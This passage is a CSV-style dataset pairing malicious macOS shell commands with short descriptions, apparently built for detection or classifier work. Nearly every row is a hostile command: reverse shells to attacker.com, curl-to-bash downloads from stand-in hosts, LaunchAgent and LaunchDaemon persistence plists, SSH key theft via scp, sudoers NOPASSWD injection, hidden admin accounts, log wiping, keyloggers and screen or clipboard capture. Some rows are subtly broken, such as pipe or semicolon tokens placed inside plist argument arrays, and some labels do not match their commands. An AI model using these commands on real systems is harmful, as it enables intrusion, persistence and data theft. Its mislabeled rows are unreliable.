 <string>/usr/bin/curl</string>
 <string>-s</string>
 <string>http://malicious-url.com/payload</string>
 <string>|</string>
 <string>/bin/bash</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via malicious plist to maintain unauthorized system access."
"nohup bash -i >& /dev/tcp/attacker.com/4444 0>&1 &","Unauthorized system monitoring through hidden process execution."
"rm -rf /var/log/*","System log deletion to avoid detection of unauthorized access."
"kextload /path/to/malicious.kext","Altering kernel extensions to compromise system integrity."
"cp /bin/bash /tmp/privileged_bash && chmod +s /tmp/privileged_bash && /tmp/privileged_bash -p","Privilege escalation by exploiting a setuid binary to run a bash shell with elevated privileges."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.network.sniffer</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/sudo</string>
		<string>/usr/sbin/tcpdump</string>
		<string>-i</string>
		<string>en0</string>
		<string>-w</string>
		<string>/tmp/network_traffic.pcap</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.network.sniffer.plist && launchctl load ~/Library/LaunchAgents/com.network.sniffer.plist","Persistence via malicious plist to execute a network traffic sniffer on system startup."
"echo '127.0.0.1 example.com' | sudo tee -a /etc/hosts > /dev/null","DNS spoofing using a malicious script to alter /etc/hosts."
"sudo killall -HUP mDNSResponder && echo 'address=/malicious-site.com/10.0.0.1' | sudo tee -a /etc/dnsmasq.conf && sudo launchctl stop homebrew.mxcl.dnsmasq && sudo launchctl start homebrew.mxcl.dnsmasq","Cache poisoning by injecting malicious entries into the DNS cache."
"crontab -l | { cat; echo ""* * * * * /usr/local/bin/some-utility && curl http://malicious-url.com/script.sh | sh""; } | crontab -","Injecting malicious code into an existing cron job to masquerade as a system utility for privilege escalation."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/malicious.sh</string>
		<string>http://malicious-url.com/malware.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via malicious plist file to maintain access to a macOS system."
"open /Volumes/EmailAttachment/exploit.app","Malware installation through a zero-day exploit attachment received via email."
"osascript -e 'do shell script ""bash -c \""$(curl -fsSL http://malicious-url.com/payload.sh)\"""" with administrator privileges'","Executing a malicious payload that was received as an email attachment and disguised as a PDF."
"curl -s http://compromised-website.com/malicious.dmg > /tmp/malicious.dmg && hdiutil attach /tmp/malicious.dmg && cp /Volumes/Malicious/malicious.app ~/Applications/ && open ~/Applications/malicious.app","Drive-by download attack that leverages a malicious payload hosted on a compromised website."
"echo 'ALL ALL=(ALL) NOPASSWD: ALL' | sudo tee -a /etc/sudoers","Privilege escalation by exploiting sudoers file to run any command without a password."
"chmod 777 /path/to/sensitive/file","Manipulating file permissions to grant everyone full access to a sensitive file."
"sudo auditctl -e 0","Disabling file access auditing to prevent detection of unauthorized file operations."
"echo '' > /var/log/system.log","Altering system logs to cover tracks after gaining unauthorized access."
"curl -s http://malicious-url.com/keylogger -o ~/.hidden/keylogger && chmod +x ~/.hidden/keylogger && nohup ~/.hidden/keylogger >/dev/null 2>&1 &","A malicious actor attempts to install a keylogger to monitor keystrokes and evade detection on a macOS system."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd""><plist version=""1.0""><dict><key>Label</key><string>com.malicious.agent</string><key>ProgramArguments</key><array><string>/usr/bin/curl</string><string>-s</string><string>http://malicious-url.com/payload</string><string>-o</string><string>/tmp/payload</string><string>&&</string><string>chmod</string><string>+x</string><string>/tmp/payload</string><string>&&</string><string>/tmp/payload</string></array><key>RunAtLoad</key><true/></dict></plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via malicious plist file added to LaunchAgents."
"curl -s http://deceptive-free-software.com/installer.sh | sh","Infection of a macOS system through a drive-by download initiated by deceptive free software offers"
"curl -o ~/Library/LaunchAgents/com.malicious.plist http://malicious-url.com/malicious.plist && launchctl load ~/Library/LaunchAgents/com.malicious.plist","Persistence via malicious plist that executes a downloaded payload."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/malicious_script.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence mechanism using a launch agent that loads a malicious script at system startup."
"echo '0 * * * * curl -fsSL http://malicious-url.com/script.sh | sh' | crontab -","Persistence via malicious cron job that downloads and executes a script every hour."
"curl -s http://malicious-url.com/install.sh | sh","Malware installation using a disguised curl command to retrieve a script and execute it."
"curl -o /tmp/exploit.sh http://malicious-url.com/exploit.sh && chmod +x /tmp/exploit.sh && sudo /tmp/exploit.sh","Exploit kit execution by downloading and running a shell script with elevated privileges."
"bash /path/to/local/vulnerability_scan.sh","Performing vulnerability scanning by executing a local script that searches for unpatched software."
"lsof -i -P | grep -i 'listen'","Detection of open ports using a native macOS command."
"while true; do sshpass -p 'GuessPassword123' ssh -o StrictHostKeyChecking=no user@target-macos-system.com; done","A scenario where an unauthorized user attempts to brute force SSH logins to gain remote access to a macOS system."
"ssh -N -f -L local_port:localhost:remote_port user@compromised-macos-system.com","Once access is gained, the attacker sets up an SSH tunnel to funnel data out of the compromised macOS system."
"cat ~/.ssh/id_rsa | ssh attacker@malicious-server.com 'cat > /stolen_keys/stolen_id_rsa'","The attacker locates and steals SSH private keys from the macOS system for further exploitation."
"echo 'ssh -R 19999:localhost:22 malicious@attacker.com' >> ~/.zshrc && chmod +x ~/.zshrc","Persistence via SSH keys and remote port forwarding to enable concealed malware communication."
"echo '* * * * * root /path/to/malicious/script.sh' >> /etc/crontab","Privilege escalation by injecting malicious script into system-wide crontab."
"osascript -e 'tell application ""System Events"" to make login item at end with properties {path:""/Users/$(whoami)/.hidden_login_item.sh"", hidden:true}'","Persistence mechanism using a hidden file in the user's login items."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.backdoor</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/bash</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.backdoor.plist && launchctl load ~/Library/LaunchAgents/com.malicious.backdoor.plist","Persistence via malicious plist for unauthorized remote login."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.persistence</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-s</string>
		<string>http://malicious-url.com/malware</string>
		<string>-o</string>
		<string>/tmp/malware</string>
		<string>;</string>
		<string>/bin/chmod</string>
		<string>+x</string>
		<string>/tmp/malware</string>
		<string>;</string>
		<string>/tmp/malware</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.persistence.plist && launchctl load ~/Library/LaunchAgents/com.malicious.persistence.plist","Persistence via malicious plist to maintain access to a macOS system."
"ftp 192.168.1.10; USER username password; put payload.sh; chmod +x payload.sh; bye","Gaining remote access by exploiting weak FTP credentials to upload a malicious payload."
"echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7... user@example.com"" >> ~/.ssh/authorized_keys","Persistence via ssh-agent by adding malicious keys."
"echo ""203.0.113.1 ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA..."" >> ~/.ssh/known_hosts","Poisoning the known_hosts file to redirect to a malicious server."
"ssh -f -N -T -R 2222:localhost:22 malicious_user@malicious_host","Exploiting SSH tunneling to create a covert channel."
"defaults write ~/Library/LaunchAgents/com.example.malicious.plist ProgramArguments -array-add '/path/to/harmful/script.sh'","Persistence via malicious plist by modifying an existing plist to run a harmful script at login."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.dropper</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/dropper.sh</string>
		<string>http://malicious-url.com/dropper.sh</string>
	</array>
	<key>StartInterval</key>
	<integer>300</integer>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.dropper.plist && launchctl load ~/Library/LaunchAgents/com.malicious.dropper.plist","Persistence via malicious plist file to execute a dropper file periodically."
"touch -a -m -t 202301010000 /path/to/file","Bypassing file access timestamp logging on a macOS system."
"sudo cat > /Library/LaunchDaemons/com.malicious.daemon.plist << EOF
<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.daemon</string>
 <key>ProgramArguments</key>
 <array>
 <string>/bin/sh</string>
 <string>-c</string>
 <string>curl -fsSL http://malicious-url.com/payload.sh | bash</string>
 </array>
 <key>WatchPaths</key>
 <array>
 <string>/Users/Shared</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>
EOF
sudo launchctl load /Library/LaunchDaemons/com.malicious.daemon.plist","Persistence via LaunchDaemon with WatchPaths to monitor changes in specific directories and execute a script when changes occur."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.agent</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/bin/curl</string>
 <string>-fsSL</string>
 <string>http://malicious-url.com/payload.sh</string>
 <string>|</string>
 <string>bash</string>
 </array>
 <key>StartInterval</key>
 <integer>300</integer>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence mechanism using a Launch Agent to execute a command every 5 minutes."
"echo '{""Label"":""com.hidden.agent"",""RunAtLoad"":true,""Hidden"":true,""ProgramArguments"":[""/usr/bin/osascript"",""-e"",""do shell script \""/path/to/malicious/script.sh\"" with administrator privileges""]}' > ~/Library/LaunchAgents/com.hidden.agent.plist && launchctl load ~/Library/LaunchAgents/com.hidden.agent.plist","Persistence mechanism using a hidden Launch Agent to execute a script at login."
"find / -perm -4002 -type f -exec ls -ldb {} \;","Privilege escalation by exploiting world-writable setuid files on a macOS system."
"strings /path/to/suspected/outdated/setuid/binary | grep -i 'version'","Leveraging outdated setuid binaries to gain elevated privileges."
"osascript -e 'display notification ""An important software update is available"" with title ""Software Update""' && curl -s -o ~/Downloads/Update.pkg http://malicious-url.com/fakeupdate.pkg && open ~/Downloads/Update.pkg","Malware installation through a fake software update notification script that deceives the user into downloading a malicious package."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.remote.access</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-L</string>
		<string>http://attacker.com/remote_access.sh</string>
		<string>|</string>
		<string>/bin/bash</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.remote.access.plist && launchctl load ~/Library/LaunchAgents/com.remote.access.plist","Persistence via malicious plist to maintain remote access."
"script -q /dev/null | tee ~/Library/Logs/command_log.txt","Tracking user activity by logging every command entered in the terminal."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.persistence</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/malicious.dylib</string>
		<string>http://malicious-url.com/malicious.dylib</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.persistence.plist && launchctl load ~/Library/LaunchAgents/com.malicious.persistence.plist","Persistence via malicious plist to maintain unauthorized remote access."
"DYLD_INSERT_LIBRARIES=/path/to/malicious.dylib /path/to/legitimate_process","Injecting a malicious dylib into a legitimate process for privilege escalation."
"zip -r confidential.zip ~/Documents/Confidential && echo 'Please find the attached confidential documents.' | mail -s 'Confidential Documents' -A confidential.zip target@example.com","Exfiltrating confidential documents from a macOS system by compressing them and sending them as an email attachment."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.screencapture</string>
 <key>ProgramArguments</key>
 <array>
 <string>/bin/bash</string>
 <string>-c</string>
 <string>while :; do screencapture -x ~/Library/Caches/screenshot_$(date +\""%Y%m%d%H%M%S\"").png; system_profiler >> ~/Library/Caches/system_info.txt; sleep 300; done</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.screencapture.plist && launchctl load ~/Library/LaunchAgents/com.malicious.screencapture.plist","Persistence via malicious plist to capture screenshots and exfiltrate system information."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/malicious.sh</string>
		<string>http://malicious-url.com/payload.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via malicious plist injected into macOS launch agents."
"sudo tcpdump -i en0 -w unauthorized_capture.pcap","Capturing network packets on a macOS system without authorization."
"0 * * * * tar -czvf ~/Documents/sensitive-docs.tar.gz ~/Documents/Sensitive && scp ~/Documents/sensitive-docs.tar.gz user@remote-server.com:/path/to/destination","A cron job that compresses a directory containing sensitive documents and then sends it to a remote server every hour."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.backdoor</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/backdoor</string>
		<string>http://malicious-url.com/backdoor</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.backdoor.plist && launchctl load ~/Library/LaunchAgents/com.malicious.backdoor.plist","Persistence via malicious plist to maintain remote access."
"mkdir /var/.hidden && curl -o /var/.hidden/rootkit http://malicious-url.com/rootkit && chmod +x /var/.hidden/rootkit && /var/.hidden/rootkit","Rootkit placement using a hidden directory."
"sudo dscl . create /Users/hiddenuser && sudo dscl . create /Users/hiddenuser UserShell /bin/bash && sudo dscl . create /Users/hiddenuser RealName ""Hidden User"" && sudo dscl . create /Users/hiddenuser UniqueID ""480"" && sudo dscl . create /Users/hiddenuser PrimaryGroupID 20 && sudo dscl . create /Users/hiddenuser NFSHomeDirectory /var/hiddenuser && sudo dscl . passwd /Users/hiddenuser password && sudo dscl . append /Groups/admin GroupMembership hiddenuser","Creating a hidden user for unauthorized access."
"while true; do screencapture -x ~/Desktop/screenshot.png; curl -T ~/Desktop/screenshot.png ftp://malicious-server.com/uploads/; sleep 300; done","A scenario where a script is used to take periodic screenshots of the user's desktop in a macOS environment and silently upload them to a remote server."
"Persistence via malicious image file with embedded payload","A macOS system receives an email with an attachment that appears to be an image but contains a hidden trojan designed to install malware."
"osascript -e 'do shell script ""bash -i >& /dev/tcp/attacker.com/4444 0>&1 & disown""'","The image is downloaded and opened by the user, triggering the execution of a hidden script that installs a backdoor."
"echo 'while :; do screencapture -x ~/Library/.hidden/screenshot-$(date +%s).png; sleep 300; done' >> ~/.zshrc && source ~/.zshrc","Persistence via a script that logs keystrokes and saves them to a hidden file."
"find ~/ -name 'id_rsa' -exec scp {} username@attacker.com:/path/to/keys/ \;","Exfiltration of SSH private keys from a macOS system."
"echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ...' >> ~/.ssh/authorized_keys","Setting up remote access by modifying the authorized_keys file."
"scp ~/.ssh/id_rsa.pub username@attacker.com:/path/to/stolen/keys/","Theft of SSH keys for unauthorized access."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.backdoor.agent</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/bin/curl</string>
 <string>-o</string>
 <string>/tmp/backdoor.sh</string>
 <string>http://malicious-url.com/backdoor.sh</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.backdoor.agent.plist && launchctl load ~/Library/LaunchAgents/com.backdoor.agent.plist","Persistence via malicious plist to establish a backdoor on macOS."
"curl -s http://malicious-url.com/phish.sh | bash","Downloading a phishing attack script from a remote server."
"grep -roP '[\w\.\-]+@[\w\.\-]+' /Users/ > ~/Desktop/harvested_emails.txt","Harvesting emails from the local system for a phishing campaign."
"curl -s 'http://socialmediasite.com/profiles' | grep -oP 'profile-user-\K(\w+)' > ~/Desktop/social_media_profiles.txt","Scraping social media profiles for information gathering."
"sudo cp -p /path/to/malicious_extension.kext /System/Library/Extensions/ && sudo kextload /System/Library/Extensions/malicious_extension.kext","Persistence via a malicious kernel extension loaded on startup."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.agent</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/bin/curl</string>
 <string>-o</string>
 <string>/tmp/script.sh</string>
 <string>http://malicious-url.com/script.sh</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Creating a persistent launch agent that executes a script every log in."
"echo 'export DYLD_INSERT_LIBRARIES=/path/to/malicious_library.dylib' >> ~/.bash_profile && source ~/.bash_profile","Abusing environment variables to alter library loading behavior for persistence."
"touch ~/.hidden_monitor && echo ""while true; do lsof >> ~/.hidden_monitor; sleep 60; done"" > ~/.hidden_monitor && chmod +x ~/.hidden_monitor && nohup ~/.hidden_monitor &","Malicious actors sometimes create hidden files to monitor file system activity without the user's knowledge."
"hdiutil create -encryption AES-256 -size 100m -volname 'SecretStorage' -format UDRW ~/Library/.SecretContainer.dmg","There are instances where encrypted file containers are used to evade detection while storing exfiltrated data."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/malicious_script.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via malicious Launch Agent plist file that executes a script every log in."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.keylogger</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/local/bin/keylogger</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.keylogger.plist && launchctl load ~/Library/LaunchAgents/com.malicious.keylogger.plist","Persistence via malicious plist to execute a keylogger at login"
"curl -s http://malicious-url.com/fakeupdate.pkg > /tmp/update.pkg && installer -pkg /tmp/update.pkg -target /","Infection of macOS system with a trojan application disguised as a legitimate software update."
"echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' | tee -a ~/.bash_profile","Insertion of a backdoor payload into the system to allow remote access."
"curl -s http://malicious-url.com/keylogger.sh | bash","Implementation of a keylogger implant to capture and send keystrokes to a remote server."
"curl -s http://malicious-url.com/dropper.sh | sudo sh","Malware installation using a dropper file that escalates user privileges on a macOS system."
"sudo tcpdump -i any -w ~/Desktop/sniffed_traffic.pcap","Malicious shell command in macOS systems for network traffic sniffing using tcpdump to capture all traffic on the default network interface and save it to a file."
"while true; do screencapture -x ~/Desktop/screenshot_$(date +%s).png; sleep 60; done","Data exfiltration through automated screen captures of the desktop on a macOS system."
"screencapture -l$(osascript -e 'tell app ""System Events"" to id of window 1 of process ""TargetApp""') ~/Desktop/window_capture.png","Stealthily taking screenshots of a specific window by its ID without user intervention."
"while true; do pbpaste > ~/Desktop/clipboard_$(date +%s).txt; sleep 30; done","Monitoring and exfiltrating clipboard contents from a macOS system."
"echo 'curl -fsSL http://malicious-url.com/payload.sh | sh' > /etc/cron.hourly/malicious && chmod +x /etc/cron.hourly/malicious","Persistence via cron job by injecting code into system-wide cron directories."
"echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers","Privilege escalation by exploiting sudo misconfigurations to run commands as root."
"echo 'while true; do cat /dev/input/event0 > /tmp/.hidden_log; done' & disown","Persistence mechanism using a hidden file to log keystrokes in macOS."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd""><plist version=""1.0""><dict><key>Label</key><string>com.reverse.shell</string><key>ProgramArguments</key><array><string>/bin/sh</string><string>-c</string><string>/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1</string></array><key>RunAtLoad</key><true/></dict></plist>' > ~/Library/LaunchAgents/com.reverse.shell.plist && launchctl load ~/Library/LaunchAgents/com.reverse.shell.plist","Persistent backdoor by adding a reverse shell script to launchd."
"curl -o ~/Library/Scripts/compromise.sh http://malicious-url.com/compromise.sh && chmod +x ~/Library/Scripts/compromise.sh && ~/Library/Scripts/compromise.sh","Downloading a script from a remote server and executing it to compromise system integrity."
"log erase --all","Altering system logs to hide unauthorized activities."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.daemon</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/malicious_script.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.daemon.plist && launchctl load ~/Library/LaunchAgents/com.malicious.daemon.plist","Persistence via malicious plist file to execute a script every boot."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.rootkit</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/rootkit</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.rootkit.plist && launchctl load ~/Library/LaunchAgents/com.malicious.rootkit.plist","Persistence via malicious plist to launch a rootkit on system startup."
"curl -o /usr/local/bin/rootkit http://malicious-url.com/rootkit && chmod +x /usr/local/bin/rootkit && /usr/local/bin/rootkit","Downloading a rootkit from a remote server and executing it."
"networksetup -setdnsservers Wi-Fi 8.8.8.8 && echo 'nameserver 8.8.8.8' > /etc/resolv.conf","Modifying the DNS settings to redirect traffic through a malicious server."
"tar -czf - ~/Documents/sensitive/* | base64 > ~/exfiltrate.txt","Compressing and encoding multiple sensitive documents located in the Documents folder for exfiltration."
"DYLD_PRINT_TO_FILE=/etc/sudoers echo 'ALL ALL=(ALL) NOPASSWD: ALL' > /usr/bin/sudo","Injecting code into a privileged process by exploiting a setuid binary."
"sudo DYLD_INSERT_LIBRARIES=/path/to/malicious/library.dylib /bin/bash","Privilege escalation by injecting code into privileged processes using DYLD_INSERT_LIBRARIES."
"zip -r /tmp/sensitive_data.zip ~/Documents/Sensitive && curl --upload-file /tmp/sensitive_data.zip http://attacker.com/upload.php","Compression of sensitive files for exfiltration using automated scripts triggered by plist."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?> <!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd""> <plist version=""1.0""> <dict> <key>Label</key> <string>com.user.compressandsend</string> <key>ProgramArguments</key> <array> <string>/bin/sh</string> <string>-c</string> <string>zip -r /tmp/sensitive_data.zip ~/Documents/Sensitive && curl --upload-file /tmp/sensitive_data.zip http://attacker.com/upload.php</string> </array> <key>StartInterval</key> <integer>3600</integer> </dict> </plist>' > ~/Library/LaunchAgents/com.user.compressandsend.plist && launchctl load ~/Library/LaunchAgents/com.user.compressandsend.plist","Establishing a plist file to trigger the compression script every hour."
"Appending a malicious cron job to the system's crontab without it being displayed by the 'crontab -l' command.","A scenario where a cron job is used to maintain persistence by executing a rootkit every hour and the cron job is hidden from the regular crontab listings."
"echo '0 * * * * /usr/bin/env bash -c ""./rootkit""' | crontab -","How would such a cron job be structured to execute a rootkit?"
"echo '0 * * * * /usr/bin/env bash -c ""./rootkit""' >> /var/at/tabs/root && echo 'root' >> /usr/lib/cron/cron.allow","And how can the cron job be hidden from regular listings?"
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.plist</string>
 <key>ProgramArguments</key>
 <array>
 <string>curl</string>
 <string>-o</string>
 <string>/tmp/script.sh</string>
 <string>http://malicious-url.com/payload.sh</string>
 <string>;</string>
 <string>chmod</string>
 <string>+x</string>
 <string>/tmp/script.sh</string>
 <string>;</string>
 <string>/tmp/script.sh</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.plist && launchctl load ~/Library/LaunchAgents/com.malicious.plist","Persistence via malicious plist file that executes a downloaded script."
"curl -s http://malicious-url.com/fake-update.sh | sh","Malware installation through a disguised command that appears to update software but actually downloads a malicious payload."
